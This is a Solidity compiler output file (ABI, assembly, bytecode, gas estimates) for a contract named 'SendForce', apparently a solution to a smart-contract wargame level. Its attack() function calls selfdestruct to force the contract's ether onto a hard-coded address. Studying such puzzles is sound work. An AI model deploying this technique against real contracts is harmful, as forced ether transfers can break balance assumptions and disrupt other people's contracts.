{
	"Force1.sol": {
		"SendForce": {
			"abi": [
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "deposit",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Force1.sol\":57:294  contract SendForce {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Force1.sol\":57:294  contract SendForce {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_2\n      jumpi\n      dup1\n      0xd0e30db0\n      eq\n      tag_3\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"Force1.sol\":131:292  function attack() public payable {... */\n    tag_2:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n        /* \"Force1.sol\":84:126  function deposit() public payable {... */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      stop\n        /* \"Force1.sol\":131:292  function attack() public payable {... */\n    tag_5:\n        /* \"Force1.sol\":174:194  address payable addr */\n      0x00\n        /* \"Force1.sol\":213:255  0xE3f80bA82FcAf5946306D32E782378A4a50da5ff */\n      0xe3f80ba82fcaf5946306d32e782378a4a50da5ff\n        /* \"Force1.sol\":174:257  address payable addr = payable(address(0xE3f80bA82FcAf5946306D32E782378A4a50da5ff)) */\n      swap1\n      pop\n        /* \"Force1.sol\":280:284  addr */\n      dup1\n        /* \"Force1.sol\":267:285  selfdestruct(addr) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      selfdestruct\n        /* \"Force1.sol\":84:126  function deposit() public payable {... */\n    tag_7:\n      jump\t// out\n\n    auxdata: 0xa26469706673582212200436c8f22d14dba5b9f5084de94f47bedb9b3159309bce23e37ba29518759c4e64736f6c63430008070033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052348015600f57600080fd5b5060a58061001e6000396000f3fe60806040526004361060265760003560e01c80639e5faafc14602b578063d0e30db0146033575b600080fd5b6031603b565b005b6039606d565b005b600073e3f80ba82fcaf5946306d32e782378a4a50da5ff90508073ffffffffffffffffffffffffffffffffffffffff16ff5b56fea26469706673582212200436c8f22d14dba5b9f5084de94f47bedb9b3159309bce23e37ba29518759c4e64736f6c63430008070033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xA5 DUP1 PUSH2 0x1E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x26 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH1 0x2B JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH1 0x33 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x31 PUSH1 0x3B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x39 PUSH1 0x6D JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH20 0xE3F80BA82FCAF5946306D32E782378A4A50DA5FF SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DIV CALLDATASIZE 0xC8 CALLCODE 0x2D EQ 0xDB 0xA5 0xB9 CREATE2 ADDMOD 0x4D 0xE9 0x4F SELFBALANCE 0xBE 0xDB SWAP12 BALANCE MSIZE ADDRESS SWAP12 0xCE 0x23 0xE3 PUSH28 0xA29518759C4E64736F6C634300080700330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "33000",
						"executionCost": "87",
						"totalCost": "33087"
					},
					"external": {
						"attack()": "27709",
						"deposit()": "120"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"deposit()": "d0e30db0"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}